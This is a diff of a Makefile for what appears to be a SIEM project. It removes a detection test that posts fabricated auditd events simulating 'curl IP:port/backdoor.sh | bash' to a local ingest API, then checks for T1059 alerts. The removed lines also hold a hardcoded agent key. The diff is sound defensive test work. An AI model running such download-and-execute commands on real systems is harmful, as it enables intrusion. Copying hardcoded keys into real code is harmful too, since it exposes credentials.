@@ -1,4 +1,4 @@
-.PHONY: up down restart logs build-agent test-t1059 fix-perms
+.PHONY: up down restart logs build-agent fix-perms
 
 up: build-agent
 	@echo "🧪 Cleaning up potential container conflicts..."
@@ -49,32 +49,3 @@ fix-perms:
 	@[ -d ./api/logs ]      && sudo chown -R 1001:1001 ./api/logs      || true
 	@[ -d ./api/uploads ]   && sudo chown -R 1001:1001 ./api/uploads   || true
 	@echo "Done. Run 'make restart' to apply."
-
-# Simulate "curl IP:port/backdoor.sh | bash" through the correlation engine.
-# Three steps: Event A (curl), Event B (bash), then a flush-trigger event after the
-# 2-second aggregation TTL so the engine receives both buffered events.
-LOCALHOST_AGENT_KEY = 75718048f662d6b143fc27c3b1053ea90923c2ba4b2601ae484f2653ab103e79
-
-test-t1059:
-	@echo "🧪 Event A — curl with bare IP URL (no http:// scheme)..."
-	@curl -s -X POST http://localhost:8000/ingest/log \
-		-H "Content-Type: application/json" \
-		-H "X-Agent-Key: $(LOCALHOST_AGENT_KEY)" \
-		-d '{"log_type":"auditd","message":"type=EXECVE msg=audit(1720000100.000:400): argc=2 a0=\"curl\" a1=\"192.168.88.157:8080/backdoor.sh\""}' | python3 -m json.tool
-	@sleep 1
-	@echo "🧪 Event B — bash shell execution (pipe consumer)..."
-	@curl -s -X POST http://localhost:8000/ingest/log \
-		-H "Content-Type: application/json" \
-		-H "X-Agent-Key: $(LOCALHOST_AGENT_KEY)" \
-		-d '{"log_type":"auditd","message":"type=EXECVE msg=audit(1720000101.000:401): argc=1 a0=\"bash\""}' | python3 -m json.tool
-	@echo "⏳ Waiting 3s for 2s aggregation TTL to expire..."
-	@sleep 3
-	@echo "🧪 Flush trigger — sends a new auditd event to flush expired buffer entries..."
-	@curl -s -X POST http://localhost:8000/ingest/log \
-		-H "Content-Type: application/json" \
-		-H "X-Agent-Key: $(LOCALHOST_AGENT_KEY)" \
-		-d '{"log_type":"auditd","message":"type=SYSCALL msg=audit(1720000104.000:402): arch=c000003e syscall=59 success=yes comm=\"id\" key=\"T1059\""}' | python3 -m json.tool
-	@echo "⏳ Waiting 2s for detection to complete..."
-	@sleep 2
-	@echo "🔍 Checking for T1059/correlation alerts in PostgreSQL..."
-	@./docker-compose-v2 exec -T db psql -U user -d siemdb -c "SELECT title, host, severity, detection_engine, timestamp FROM alerts WHERE mitre_technique LIKE '%T1059%' ORDER BY timestamp DESC LIMIT 5;"
